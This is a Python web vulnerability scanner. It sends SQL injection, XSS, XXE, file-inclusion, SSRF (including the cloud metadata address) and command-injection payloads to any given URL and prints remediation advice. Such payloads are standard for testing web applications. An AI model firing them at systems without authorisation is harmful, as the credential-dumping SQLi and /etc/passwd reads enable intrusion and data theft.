import socket
import ssl
import sys
import time
import re
import urllib.parse
import http.client
import base64
import dns.resolver
import dns.query
import dns.zone
import struct
import random
import json
import xml.etree.ElementTree as ET
import threading
from queue import Queue

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/88.0.4324.96 Safari/537.36",
]

VULN_RECOMMENDATIONS = {
    "SQL Injection": "Use parameterized queries and ORM frameworks to prevent SQL injection attacks.",
    "XSS": "Sanitize and encode user input before rendering it in the browser.",
    "CSRF": "Implement anti-CSRF tokens in all forms and verify them on the server.",
    "Local File Inclusion": "Validate and sanitize file paths, and use allow-lists for file access.",
    "Remote File Inclusion": "Disable remote file inclusion and validate all user-supplied URLs.",
    "XXE": "Disable external entity parsing in XML parsers.",
    "SSRF": "Validate and restrict URLs that can be fetched by the server.",
    "Command Injection": "Never pass user input directly to system commands; use safe APIs.",
    "Deserialization": "Avoid deserializing untrusted data; use safe serialization formats.",
    "Open Redirect": "Validate and restrict redirect destinations to trusted domains.",
    "IDOR": "Enforce proper authorization checks on all resource access.",
    "HTTP Methods": "Disable unnecessary HTTP methods (e.g., PUT, DELETE) on the server.",
    "Subdomain Takeover": "Remove unused DNS records and monitor for dangling CNAMEs.",
}

class VulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed_url = urllib.parse.urlparse(target_url)
        self.domain = self.parsed_url.hostname
        self.use_ssl = self.parsed_url.scheme == "https"
        self.port = self.parsed_url.port or (443 if self.use_ssl else 80)
        self.session = {}
        self.vulnerabilities = []
        self.lock = threading.Lock()
        self.queue = Queue()
        self.headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Connection": "close"
        }

    def http_request(self, path="/", method="GET", headers=None, data=None, timeout=10, retries=2):
        final_headers = self.headers.copy()
        if headers:
            final_headers.update(headers)
        if 'Cookie' in self.session:
            final_headers['Cookie'] = self.session['Cookie']

        for attempt in range(retries):
            try:
                if self.use_ssl:
                    conn = http.client.HTTPSConnection(self.domain, self.port, timeout=timeout)
                else:
                    conn = http.client.HTTPConnection(self.domain, self.port, timeout=timeout)

                conn.request(method, path, body=data, headers=final_headers)
                response = conn.getresponse()
                body = response.read().decode(errors='ignore')
                resp_headers = dict(response.getheaders())

                # Update cookies
                if 'set-cookie' in resp_headers:
                    self.session['Cookie'] = resp_headers['set-cookie']

                conn.close()
                return response.status, body, resp_headers
            except Exception as e:
                if attempt == retries - 1:
                    with self.lock:
                        print(f"[-] HTTP request failed after {retries} attempts: {e}")
                    return None, "", {}
                time.sleep(1)
        return None, "", {}

    def scan_sql_injection(self):
        with self.lock:
            print("[*] Starting deep SQL injection scan")

        test_params = ['id', 'user', 'name', 'search', 'q', 'category', 'page', 'item', 'product']
        payloads = [
            ("' OR '1'='1", "boolean-based"),
            ("' OR SLEEP(5)--", "time-based"),
            ("' UNION SELECT null,concat(username,0x3a,password) FROM users--", "union-based"),
            ("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)", "time-based-advanced"),
            ("1; WAITFOR DELAY '0:0:5'--", "mssql-time-based"),
            ("1' OR 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--", "error-based"),
            ("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT (ELT(1=1,1))),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "boolean-error-based"),
            ("' OR 'x'='x", "boolean-based-simple"),
            ("' OR 1=1--", "boolean-based-simple"),
            ("' OR 'a'='a' -- ", "boolean-based-simple"),
        ]

        vulnerable = False

        for param in test_params:
            for payload, technique in payloads:
                test_query = f"{param}={urllib.parse.quote(payload)}"
                path = self.parsed_url.path or "/"
                test_url = f"{path}?{test_query}"
                start_time = time.time()
                status, body, _ = self.http_request(test_url)
                elapsed = time.time() - start_time

                if status == 200:
                    body_lower = body.lower()
                    error_signatures = ['sql syntax', 'mysql', 'syntax error', 'unclosed quotation mark', 'odbc', 'sqlstate', 'mysql_fetch', 'num_rows', 'mysql_num_rows']
                    if any(err in body_lower for err in error_signatures):
                        with self.lock:
                            print(f"[!] Possible SQLi ({technique}) at parameter: {param}")
                        self.vulnerabilities.append(f"SQL Injection ({technique}) in parameter {param}")
                        vulnerable = True
                    elif technique.startswith("time") and elapsed > 4:
                        with self.lock:
                            print(f"[!] Possible time-based SQLi at parameter: {param} (response delayed {elapsed:.2f}s)")
                        self.vulnerabilities.append(f"Time-based SQL Injection in parameter {param}")
                        vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No SQL injection vulnerabilities detected")
        return vulnerable

    def scan_xss(self):
        with self.lock:
            print("[*] Starting deep XSS scan")

        test_params = ['q', 'search', 'name', 'comment', 'user', 'message', 'input', 'text']
        payloads = [
            ("<script>alert(1)</script>", "basic"),
            ("\" onmouseover=alert(1)//", "attribute"),
            ("javascript:alert(1)", "javascript-uri"),
            ("'><img src=x onerror=alert(1)>", "img-onerror"),
            ("${alert(1)}", "template-literal"),
            ("<svg/onload=alert(1)>", "svg-onload"),
            ("<iframe src=\"javascript:alert(1)\">", "iframe"),
            ("<body onload=alert(1)>", "body-onload"),
            ("<details open ontoggle=alert(1)>", "details-ontoggle"),
        ]

        vulnerable = False

        for param in test_params:
            for payload, context in payloads:
                test_query = f"{param}={urllib.parse.quote(payload)}"
                path = self.parsed_url.path or "/"
                test_url = f"{path}?{test_query}"
                status, body, _ = self.http_request(test_url)

                if status == 200 and payload in body:
                    with self.lock:
                        print(f"[!] Possible XSS ({context}) at parameter: {param}")
                    self.vulnerabilities.append(f"XSS ({context}) in parameter {param}")
                    vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No XSS vulnerabilities detected")
        return vulnerable

    def scan_csrf(self):
        with self.lock:
            print("[*] Checking for CSRF vulnerabilities")

        test_paths = ['/login', '/admin', '/profile', '/change-password', '/settings']
        vulnerable = False

        for path in test_paths:
            status, body, _ = self.http_request(path)
            if status == 200:
                forms = re.findall(r'<form.*?</form>', body, re.DOTALL | re.IGNORECASE)
                for form in forms:
                    if not re.search(r'(csrf|token|nonce|authenticity_token)', form, re.IGNORECASE):
                        with self.lock:
                            print(f"[!] Possible CSRF vulnerability in form at {path}")
                        self.vulnerabilities.append(f"CSRF vulnerability in form at {path}")
                        vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No obvious CSRF vulnerabilities detected")
        return vulnerable

    def scan_file_inclusion(self):
        with self.lock:
            print("[*] Scanning for file inclusion vulnerabilities")

        test_params = ['file', 'page', 'load', 'template', 'view', 'path']
        local_files = ['/etc/passwd', '/etc/hosts', 'C:\\Windows\\win.ini', 'C:\\Windows\\System32\\drivers\\etc\\hosts']
        remote_files = ['http://example.com/test.txt']
        vulnerable = False

        for param in test_params:
            for local_file in local_files:
                test_query = f"{param}={urllib.parse.quote(local_file)}"
                path = self.parsed_url.path or "/"
                test_url = f"{path}?{test_query}"
                status, body, _ = self.http_request(test_url)
                if status == 200:
                    if ('root:' in body or 'hosts' in body or '[extensions]' in body or 'windows' in body.lower()):
                        with self.lock:
                            print(f"[!] Possible Local File Inclusion (LFI) at parameter: {param}")
                        self.vulnerabilities.append(f"Local File Inclusion in parameter {param}")
                        vulnerable = True

        for param in test_params:
            for remote_file in remote_files:
                test_query = f"{param}={urllib.parse.quote(remote_file)}"
                path = self.parsed_url.path or "/"
                test_url = f"{path}?{test_query}"
                status, body, _ = self.http_request(test_url)
                if status == 200 and 'Example Domain' in body:
                    with self.lock:
                        print(f"[!] Possible Remote File Inclusion (RFI) at parameter: {param}")
                    self.vulnerabilities.append(f"Remote File Inclusion in parameter {param}")
                    vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No file inclusion vulnerabilities detected")
        return vulnerable

    def scan_xxe(self):
        with self.lock:
            print("[*] Scanning for XXE vulnerabilities")

        test_paths = ['/api/xml', '/xmlrpc', '/soap', '/rest', '/upload']
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""

        vulnerable = False

        for path in test_paths:
            headers = {'Content-Type': 'application/xml'}
            status, body, _ = self.http_request(path, method="POST", data=xxe_payload, headers=headers)
            if status == 200 and 'root:' in body:
                with self.lock:
                    print(f"[!] Possible XXE vulnerability at {path}")
                self.vulnerabilities.append(f"XXE vulnerability at {path}")
                vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No XXE vulnerabilities detected")
        return vulnerable

    def scan_ssrf(self):
        with self.lock:
            print("[*] Scanning for SSRF vulnerabilities")

        test_params = ['url', 'proxy', 'image', 'load', 'fetch', 'redirect']
        internal_ips = ['127.0.0.1', '192.168.1.1', '10.0.0.1', '169.254.169.254']
        vulnerable = False

        for param in test_params:
            for ip in internal_ips:
                test_query = f"{param}={urllib.parse.quote(f'http://{ip}/')}"
                path = self.parsed_url.path or "/"
                test_url = f"{path}?{test_query}"
                status, body, _ = self.http_request(test_url)
                if status == 200 and ('localhost' in body.lower() or 'internal' in body.lower() or 'metadata' in body.lower()):
                    with self.lock:
                        print(f"[!] Possible SSRF at parameter: {param} targeting {ip}")
                    self.vulnerabilities.append(f"SSRF in parameter {param} targeting {ip}")
                    vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No SSRF vulnerabilities detected")
        return vulnerable

    def scan_command_injection(self):
        with self.lock:
            print("[*] Scanning for command injection vulnerabilities")

        test_params = ['cmd', 'command', 'exec', 'ping', 'host', 'ip']
        payloads = [
            (';id', 'unix'),
            ('|id', 'unix'),
            ('&&id', 'unix'),
            ('`id`', 'unix'),
            ('%0aid', 'unix-newline'),
            ('\nid', 'unix-newline-raw'),
            ('&ipconfig', 'windows'),
            ('|ipconfig', 'windows'),
            ('%0aipconfig', 'windows-newline')
        ]

        vulnerable = False

        for param in test_params:
            for payload, platform in payloads:
                test_query = f"{param}={urllib.parse.quote(payload)}"
                path = self.parsed_url.path or "/"
                test_url = f"{path}?{test_query}"
                status, body, _ = self.http_request(test_url)
                if status == 200:
                    body_lower = body.lower()
                    if ('uid=' in body_lower or 'gid=' in body_lower or 'microsoft' in body_lower or 'windows ip configuration' in body_lower):
                        with self.lock:
                            print(f"[!] Possible command injection ({platform}) at parameter: {param}")
                        self.vulnerabilities.append(f"Command Injection ({platform}) in parameter {param}")
                        vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No command injection vulnerabilities detected")
        return vulnerable

    def scan_deserialization(self):
        with self.lock:
            print("[*] Scanning for insecure deserialization")

        java_payload = (
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRhcmdldFNpem"
            "V4cAAAAABzcgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAA"
        )
        php_payload = 'O:8:"stdClass":1:{s:5:"dummy";s:10:"vulnerable";}'

        test_paths = ['/api/object', '/serialize', '/deserialize', '/api/deserialize']
        vulnerable = False

        for path in test_paths:
            headers_java = {'Content-Type': 'application/x-java-serialized-object'}
            status, body, _ = self.http_request(path, method="POST", data=java_payload, headers=headers_java)
            if status == 500 and 'java' in body.lower():
                with self.lock:
                    print(f"[!] Possible Java deserialization vulnerability at {path}")
                self.vulnerabilities.append(f"Java Deserialization at {path}")
                vulnerable = True

            headers_php = {'Content-Type': 'application/x-www-form-urlencoded'}
            status, body, _ = self.http_request(path, method="POST", data=f"data={urllib.parse.quote(php_payload)}", headers=headers_php)
            if status == 200 and 'vulnerable' in body.lower():
                with self.lock:
                    print(f"[!] Possible PHP object injection at {path}")
                self.vulnerabilities.append(f"PHP Object Injection at {path}")
                vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No deserialization vulnerabilities detected")
        return vulnerable

    def scan_open_redirect(self):
        with self.lock:
            print("[*] Scanning for open redirects")

        test_params = ['redirect', 'url', 'next', 'target', 'dest']
        external_url = 'https://example.com'
        vulnerable = False

        for param in test_params:
            test_query = f"{param}={urllib.parse.quote(external_url)}"
            path = self.parsed_url.path or "/"
            test_url = f"{path}?{test_query}"
            status, _, headers = self.http_request(test_url)
            if status in [301, 302, 303, 307, 308]:
                location = headers.get('location', '')
                if external_url in location:
                    with self.lock:
                        print(f"[!] Possible open redirect at parameter: {param}")
                    self.vulnerabilities.append(f"Open Redirect in parameter {param}")
                    vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No open redirect vulnerabilities detected")
        return vulnerable

    def scan_idor(self):
        with self.lock:
            print("[*] Scanning for IDOR vulnerabilities")

        test_paths = ['/user/1/profile', '/documents/1', '/orders/100', '/account/1', '/invoice/1']
        vulnerable = False

        for path in test_paths:
            status, body, _ = self.http_request(path)
            if status == 200:
                body_lower = body.lower()
                if ('profile' in body_lower or 'document' in body_lower or 'order' in body_lower or 'invoice' in body_lower):
                    with self.lock:
                        print(f"[!] Possible IDOR at {path}")
                    self.vulnerabilities.append(f"IDOR vulnerability at {path}")
                    vulnerable = True

        if not vulnerable:
            with self.lock:
                print("[-] No IDOR vulnerabilities detected")
        return vulnerable

    def scan_http_methods(self):
        with self.lock:
            print("[*] Checking allowed HTTP methods")

        vulnerable = False
        try:
            if self.use_ssl:
                conn = http.client.HTTPSConnection(self.domain, self.port, timeout=10)
            else:
                conn = http.client.HTTPConnection(self.domain, self.port, timeout=10)

            conn.request("OPTIONS", self.parsed_url.path or "/")
            response = conn.getresponse()
            allow = response.getheader('allow')
            conn.close()

            if allow:
                methods = [m.strip().upper() for m in allow.split(',')]
                dangerous_methods = {'PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH'}
                found = dangerous_methods.intersection(methods)
                if found:
                    with self.lock:
                        print(f"[!] Dangerous HTTP methods allowed: {', '.join(found)}")
                    self.vulnerabilities.append(f"Dangerous HTTP methods allowed: {', '.join(found)}")
                    vulnerable = True
                else:
                    with self.lock:
                        print("[-] No dangerous HTTP methods allowed")
            else:
                with self.lock:
                    print("[-] No Allow header found in OPTIONS response")
        except Exception as e:
            with self.lock:
                print(f"[-] Failed to check HTTP methods: {e}")

        return vulnerable

    def scan_subdomain_takeover(self):
        with self.lock:
            print("[*] Checking for subdomain takeover")

        vulnerable = False
        try:
            answers = dns.resolver.resolve(self.domain, 'CNAME')
            for rdata in answers:
                cname = rdata.target.to_text().rstrip('.')
                # Common vulnerable CNAME targets
                vulnerable_targets = [
                    's3.amazonaws.com',
                    'herokuapp.com',
                    'github.io',
                    'bitbucket.io',
                    'cloudapp.net',
                    'azurewebsites.net',
                    'pantheon.io',
                    'wpengine.com',
                    'fastly.net',
                    'ghost.io',
                    'zendesk.com',
                    'help.github.com',
                ]
                for target in vulnerable_targets:
                    if target in cname:
                        with self.lock:
                            print(f"[!] Possible subdomain takeover via CNAME to {cname}")
                        self.vulnerabilities.append(f"Subdomain takeover risk via CNAME to {cname}")
                        vulnerable = True
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
            with self.lock:
                print("[-] No CNAME records found or DNS query failed")
        except Exception as e:
            with self.lock:
                print(f"[-] DNS query error: {e}")

        if not vulnerable:
            with self.lock:
                print("[-] No subdomain takeover vulnerabilities detected")
        return vulnerable

    def run_all_scans(self):
        scan_functions = [
            self.scan_sql_injection,
            self.scan_xss,
            self.scan_csrf,
            self.scan_file_inclusion,
            self.scan_xxe,
            self.scan_ssrf,
            self.scan_command_injection,
            self.scan_deserialization,
            self.scan_open_redirect,
            self.scan_idor,
            self.scan_http_methods,
            self.scan_subdomain_takeover,
        ]

        threads = []
        for func in scan_functions:
            t = threading.Thread(target=func)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        self.print_summary()

    def print_summary(self):
        with self.lock:
            print("\n=== Vulnerability Scan Summary ===")
            if not self.vulnerabilities:
                print("No vulnerabilities detected.")
                return

            vuln_count = {}
            for vuln in self.vulnerabilities:
                key = vuln.split(' ')[0]  # e.g. "SQL", "XSS", "CSRF"
                # Normalize keys for known types
                if "SQL Injection" in vuln:
                    key = "SQL Injection"
                elif "XSS" in vuln:
                    key = "XSS"
                elif "CSRF" in vuln:
                    key = "CSRF"
                elif "File Inclusion" in vuln:
                    if "Local" in vuln:
                        key = "Local File Inclusion"
                    else:
                        key = "Remote File Inclusion"
                elif "XXE" in vuln:
                    key = "XXE"
                elif "SSRF" in vuln:
                    key = "SSRF"
                elif "Command Injection" in vuln:
                    key = "Command Injection"
                elif "Deserialization" in vuln:
                    key = "Deserialization"
                elif "Open Redirect" in vuln:
                    key = "Open Redirect"
                elif "IDOR" in vuln:
                    key = "IDOR"
                elif "HTTP methods" in vuln:
                    key = "HTTP Methods"
                elif "Subdomain takeover" in vuln:
                    key = "Subdomain Takeover"
                else:
                    key = vuln.split(' ')[0]

                vuln_count[key] = vuln_count.get(key, 0) + 1

            for vuln_type, count in vuln_count.items():
                print(f"{vuln_type}: {count} instance(s)")
                if vuln_type in VULN_RECOMMENDATIONS:
                    print(f"  Recommendation: {VULN_RECOMMENDATIONS[vuln_type]}")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <target_url>")
        print("Example: python scanner.py https://example.com")
        sys.exit(1)

    target_url = sys.argv[1]
    scanner = VulnerabilityScanner(target_url)
    scanner.run_all_scans()

if __name__ == "__main__":
    main()